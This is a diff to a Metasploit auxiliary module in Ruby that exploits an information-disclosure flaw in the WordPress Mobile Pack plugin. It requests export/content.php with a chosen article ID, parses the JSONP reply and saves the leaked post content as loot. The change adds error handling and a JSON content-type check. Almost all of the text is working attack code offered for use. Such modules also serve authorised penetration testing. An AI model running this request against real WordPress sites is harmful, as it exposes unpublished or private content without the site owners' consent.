@@ -45,30 +45,36 @@ class Metasploit3 < Msf::Auxiliary
 
     postid = datastore['POSTID']
 
-    res = send_request_cgi(
-      'method'    => 'GET',
-      'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
-      'vars_get'  =>
-        {
+    begin
+      res = send_request_cgi(
+        'method'    => 'GET',
+        'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
+        'vars_get'  => {
           'content'   => 'exportarticle',
           'callback'  => 'exportarticle',
           'articleId' => "#{postid}"
         }
-    )
+      )
+      temp = JSON.parse(res.body.gsub(/exportarticle\(/, "").gsub(/\)/, ""))
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
+      print_error("#{peer} - The following Error was encountered: #{e.class}")
+      return
+    end
 
-    if res && res.code == 200 && res.body.length > 0
+    if res &&
+        res.code == 200 &&
+        res.body.length > 0 &&
+        res.headers['Content-Type'].include?('application/json')
 
-      vprint_status('Downloading information...')
-      vprint_line("\n#{res.body}\n")
-
-      fname = datastore['FILEPATH']
+      vprint_status('Enumerating information...')
+      res_clean = JSON.pretty_generate(temp)
+      vprint_good("Found:\n\n#{res_clean}\n")
 
       path = store_loot(
         'mobilepack.disclosure',
         'text/plain',
         ip,
-        res.body,
-        fname
+        res_clean
       )
 
       print_good("#{peer} - File saved in: #{path}")
